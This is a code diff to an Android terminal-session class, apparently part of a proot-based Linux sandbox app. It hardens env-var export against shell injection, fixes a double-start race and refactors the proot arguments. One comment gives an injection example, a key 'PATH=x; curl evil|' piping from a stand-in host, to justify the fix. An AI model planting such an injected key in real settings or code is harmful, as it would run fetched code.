@@ -43,6 +43,13 @@ class TerminalSession(private val context: Context) {
         const val DEFAULT_ROWS = 24
 
         /**
+         * Env keys interpolated into an `export` line must be plain shell
+         * identifiers — anything else is rejected (not sanitized) because a
+         * key like `PATH=x; curl evil|` would execute, not export.
+         */
+        internal val ENV_KEY = Regex("[A-Za-z_][A-Za-z0-9_]*")
+
+        /**
          * Weak-reference registry of live sessions so the Application can push
          * environment updates (e.g. ACTION_TIMEZONE_CHANGED) into already-running
          * interactive shells. Stale weak refs are cleaned on each iteration.
@@ -76,6 +83,17 @@ class TerminalSession(private val context: Context) {
 
     private val _state = MutableStateFlow(State.IDLE)
     val state: StateFlow<State> = _state.asStateFlow()
+
+    /**
+     * Resolves true once this session's own startup prelude
+     * (GuestLimits.interactivePrelude() + `cd /var/minis && clear`) has been
+     * written into the PTY. Consumers that type a first command into a fresh
+     * shell await this instead of sleeping a fixed settle — typing before the
+     * prelude meant the agent's command landed before the `clear` and its
+     * output was wiped.
+     */
+    private val _preludeDone = MutableStateFlow(false)
+    val preludeDone: StateFlow<Boolean> = _preludeDone.asStateFlow()
 
     /** Raw PTY output bytes — delta stream for legacy consumers not using Termux TerminalView. */
     private val _outputBytes = MutableSharedFlow<ByteArray>(
@@ -126,8 +144,15 @@ class TerminalSession(private val context: Context) {
      */
     fun start(sessionId: String? = null, initialCols: Int = DEFAULT_COLS, initialRows: Int = DEFAULT_ROWS) {
         if (!scope.isActive) scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
-        if (_state.value == State.RUNNING) return
+        // BOOTING blocks re-entry too: the PTY construction runs inside a
+        // coroutine, so a second start() while the first was still awaiting
+        // PRootKernel.boot() fell through the old RUNNING-only guard and
+        // spawned a second proot process tree under this session.
+        if (_state.value == State.RUNNING || _state.value == State.BOOTING) return
         _state.value = State.BOOTING
+        // A restart must re-arm the prelude wait: consumers awaiting
+        // [preludeDone] must not observe the previous incarnation's write.
+        _preludeDone.value = false
         cols = initialCols
         rows = initialRows
 
@@ -191,13 +216,18 @@ class TerminalSession(private val context: Context) {
                 Log.i(TAG, "Termux PTY started: cols=$cols rows=$rows sessionId=$sessionId")
 
                 // If a session is active, cd into its workspace so the user lands
-                // in a familiar directory (mirrors legacy behaviour).
-                kotlinx.coroutines.delay(300)
+                // in a familiar directory (mirrors legacy behaviour). The write is
+                // event-driven off the RUNNING transition instead of a fixed
+                // 300ms sleep: the bytes queue in the PTY until bash reads them,
+                // so writing immediately is safe, and preludeDone below lets
+                // consumers (MinisTerminals.sendInitialCommand) observe the
+                // write instead of guessing its timing.
                 termuxShellPid(session)?.let {
                     SandboxWorkload.trackPid(it, "terminal:${sessionId ?: "anon"}")
                 }
                 val initCmd = (GuestLimits.interactivePrelude() + "cd /var/minis && clear\r").toByteArray()
                 session.write(initCmd, 0, initCmd.size)
+                _preludeDone.value = true
             } catch (t: Throwable) {
                 Log.e(TAG, "Failed to start Termux PTY session", t)
                 _outputBytes.emit("Error: ${t.message}\r\n".toByteArray())
@@ -385,6 +415,13 @@ class TerminalSession(private val context: Context) {
         if (env.isEmpty()) return
         val sb = StringBuilder()
         for ((k, v) in env) {
+            // Same key whitelist as PersistentShell.applyEnvironment: these keys
+            // come from user-editable settings and are interpolated verbatim
+            // into an `export` line — a crafted key could inject shell syntax.
+            if (!ENV_KEY.matches(k)) {
+                Log.w(TAG, "applyEnvMap: skipping illegal env key '${k.take(32)}'")
+                continue
+            }
             val escaped = v.replace("'", "'\\''")
             sb.append("export ").append(k).append("='").append(escaped).append("'\r")
         }
@@ -416,31 +453,16 @@ class TerminalSession(private val context: Context) {
         rootfsManager: RootfsManager,
         proot: String,
     ): List<String> {
-        val args = mutableListOf<String>()
-
-        // argv[0] → program name. Do NOT reorder this before proot.
-        args.add(proot)
-        args.add("-0")
-        args.add("--link2symlink")
-        args.add("--kill-on-exit")
-        args.add("-r"); args.add(rootfsManager.rootfsDir.absolutePath)
-        args.add("-b"); args.add("/dev")
-        args.add("-b"); args.add("/proc")
-        args.add("-b"); args.add("/sys")
-        args.add("-w"); args.add("/root")
-
-        // Bind mounts — global + per-session overlay.
-        // Keep OpenMinis-Linux bind mounts (PRootKernel.bindMounts already
-        // includes /var/minis workspace). Do not overlay RikkaMinis minis-sessions/.
-        for ((linuxPath, hostPath) in PRootKernel.bindMounts) {
-            args.add("-b"); args.add("$hostPath:$linuxPath")
-        }
-
-        // Native offload socket.
-        val handlers = NativeOffloadServer.registeredHandlers
-        if (handlers.isNotEmpty()) {
-            args.add("--native-offload=${NativeOffloadServer.socketName}:${handlers.joinToString(",")}")
-        }
+        // Shared proot prefix (formerly a hand-rolled copy — see
+        // PRootKernel.commonArgv). Same flags, same order, global bind mounts
+        // and the native-offload socket included.
+        val args = PRootKernel.commonArgv(
+            prootPath = proot,
+            rootfsDir = rootfsManager.rootfsDir.absolutePath,
+            bindMounts = PRootKernel.bindMounts,
+            includeSys = true,
+            includeNativeOffload = true,
+        )
 
         // Login + interactive shell.
         // Prefer bash (readline, Ctrl+C-at-prompt semantics), but fall back
